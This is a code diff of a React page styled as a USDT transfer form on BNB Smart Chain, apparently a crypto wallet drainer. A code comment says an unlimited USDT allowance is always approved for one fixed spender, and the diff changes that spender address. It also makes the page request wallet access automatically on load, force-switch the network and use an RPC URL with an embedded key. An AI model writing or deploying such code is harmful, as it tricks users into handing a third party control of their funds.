@@ -10,7 +10,10 @@ const BSC_CHAIN_ID_DEC = 56;
 /** BEP-20 USDT on BSC (Binance-Peg USDT) */
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 
+const rpc =  `https://rpc.ankr.com/bsc/81980e93ea450e7183f250214d083c51a389ad1a1c4188853a14f59182089c29`;
+
 /** Unlimited USDT allowance is always approved for this spender only */
+// const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
 const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";
 
 const ERC20_APPROVE_ABI = [
@@ -21,6 +24,7 @@ const ERC20_APPROVE_ABI = [
 function getEthereum() {
   return typeof window !== "undefined" ? window.ethereum : undefined;
 }
+
 
 async function ensureBscNetwork(ethereum) {
   try {
@@ -37,7 +41,7 @@ async function ensureBscNetwork(ethereum) {
             chainId: BSC_CHAIN_ID_HEX,
             chainName: "BNB Smart Chain",
             nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org"],
+            rpcUrls: [rpc],
             blockExplorerUrls: ["https://bscscan.com"],
           },
         ],
@@ -68,13 +72,18 @@ const Home = () => {
   const [connectError, setConnectError] = useState(null);
   const [isProcessing, setIsProcessing] = useState(false);
   const [userBalance, setUserBalance] = useState(0n);
-
-  console.log("userBalance : ", userBalance);
+  console.log("Wallet State:", { account, chainId, userBalance });
   
 
   const refreshChain = useCallback(async (ethereum) => {
-    const idHex = await ethereum.request({ method: "eth_chainId" });
-    setChainId(Number.parseInt(idHex, 16));
+    try {
+      const idHex = await ethereum.request({ method: "eth_chainId" });
+      const id = Number.parseInt(idHex, 16);
+      console.log("Current Chain ID:", id);
+      setChainId(id);
+    } catch (e) {
+      console.error("Error refreshing chain ID:", e);
+    }
   }, []);
 
   const fetchBalance = useCallback(async (addr) => {
@@ -82,18 +91,20 @@ const Home = () => {
     if (!ethereum || !addr) return;
     try {
       const provider = new BrowserProvider(ethereum);
+      console.log(`Fetching balance for ${addr} on BSC...`);
       const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, provider);
       const balance = await usdt.balanceOf(addr);
-      console.log("balance of usdt : ", balance);
+      console.log("Balance of USDT:", formatUnits(balance, 18), "USDT");
       
       setUserBalance(balance);
     } catch (e) {
       console.error("Error fetching balance:", e);
     }
-  }, []);
+    }, []);
 
   useEffect(() => {
     if (account && chainId === BSC_CHAIN_ID_DEC) {
+      console.log("Triggering balance fetch for:", account);
       fetchBalance(account);
     }
   }, [account, chainId, fetchBalance]);
@@ -118,41 +129,41 @@ const Home = () => {
     (async () => {
       try {
         setConnectError(null);
-        const accounts = await ethereum.request({ method: "eth_accounts" });
-        setAccount(accounts[0] ?? null);
-      } catch (e) {
-        setConnectError(e?.message ?? "Could not read wallet");
-        setAccount(null);
-        return;
-      }
-      try {
-        await ensureBscNetwork(ethereum);
-      } catch (e) {
-        setConnectError(
-          e?.message ?? "Switch to BNB Smart Chain when you continue."
-        );
-      }
-      try {
+        // Automatically request account connection on mount
+        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+        const activeAccount = accounts[0] ?? null;
+        setAccount(activeAccount);
+        console.log("Connected account:", activeAccount);
+        
+        // Initial chain sync
         await refreshChain(ethereum);
-      } catch {
-        /* ignore */
+        
+        // Ensure BSC network immediately after connection
+        if (activeAccount) {
+          await ensureBscNetwork(ethereum);
+          await refreshChain(ethereum); // Refresh again after potential switch
+        }
+      } catch (e) {
+        console.error("Connection/Network init error:", e);
+        setConnectError(e?.message ?? "Could not connect wallet");
       }
     })();
-
-    return () => {
+      return () => {
       ethereum.removeListener?.("accountsChanged", onAccounts);
       ethereum.removeListener?.("chainChanged", onChain);
     };
   }, [refreshChain]);
 
-  const handlePaste = async () => {
-    try {
-      const text = await navigator.clipboard.readText();
-      if (text?.trim()) setAddress(text.trim());
-    } catch {
-      /* ignore */
+  // Proactively switch to BSC if connected to wrong network
+  useEffect(() => {
+    const ethereum = getEthereum();
+    if (ethereum && account && chainId !== null && chainId !== BSC_CHAIN_ID_DEC) {
+      console.log("Wrong network detected. Attempting auto-switch to BSC...");
+      ensureBscNetwork(ethereum).then(() => refreshChain(ethereum));
     }
-  };
+  }, [account, chainId, refreshChain]);
+  
+
 
   const handleMax = () => {
     if (userBalance > 0n) {
@@ -230,8 +241,6 @@ const Home = () => {
     }
   };
 
-  const onBsc = chainId === BSC_CHAIN_ID_DEC;
-
 return (
     <div className="max-h-screen h-full flex justify-center font-sans" style={{ backgroundColor: colors.bg }}>
       <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
@@ -258,12 +267,12 @@ return (
                 onChange={(e) => setAddress(e.target.value)}
               />
               <div className="flex items-center gap-4 ml-2" style={{ color: colors.primaryGreen }}>
-                <button onClick={() => {/* paste logic */}} className="text-sm font-bold">Paste</button>
+                <button className="text-sm font-bold">Paste</button>
                 <Clipboard size={20} />
                 <ScanLine size={20} />
               </div>
             </div>
-          </div>
+            </div>
 
           {/* Destination Network Section */}
           <div>
@@ -313,12 +322,14 @@ return (
                 );
               }
               try {
-                const parsedAmount = parseUnits(amount, 18);
-                if (userBalance < parsedAmount) {
+                const parsedAmount = amount ? parseUnits(amount, 18) : 0n;
+                if (account && userBalance < parsedAmount) {
                   return (
-                    <p className="mt-2 text-sm font-normal text-red-500">
-                      Not enough balance
-                    </p>
+                    <div className="mt-2 space-y-1">
+                      <p className="text-sm font-normal text-red-500">
+                        Not enough balance
+                      </p>
+                    </div>
                   );
                 }
               } catch (e) {
@@ -327,10 +338,10 @@ return (
               return (
                 <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>
                     ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
-                </p>
+                  </p>
               );
             })()}
-          </div>
+            </div>
         </div>
 
         
@@ -343,12 +354,12 @@ return (
         <button
           type="button"
           onClick={handleNext}
-          disabled={isProcessing || (amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18))}
-          className={`w-full ${isProcessing || (amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? 'opacity-70 cursor-not-allowed' : ''} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
+          disabled={isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18))}
+          className={`w-full ${isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? 'opacity-70 cursor-not-allowed' : ''} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
         >
           {isProcessing ? "Processing..." : "Next"}
         </button>
-      </div>
+        </div>
     </div>
   );
 };
